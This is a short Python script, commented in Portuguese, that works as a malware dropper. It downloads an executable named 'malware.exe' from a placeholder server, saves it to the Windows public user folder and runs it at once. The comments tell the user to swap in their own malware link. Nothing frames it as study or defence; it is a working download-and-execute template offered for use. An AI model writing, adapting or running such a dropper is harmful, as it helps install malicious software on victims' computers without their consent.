import requests
import os

def download_and_execute():
    url = "http://seuservidor.com/malware.exe"  # Troque pelo link do malware
    response = requests.get(url)
    
    with open("C:\\Users\\Public\\malware.exe", "wb") as f:
        f.write(response.content)
    
    os.system("C:\\Users\\Public\\malware.exe")  # Executa o malware baixado

download_and_execute()
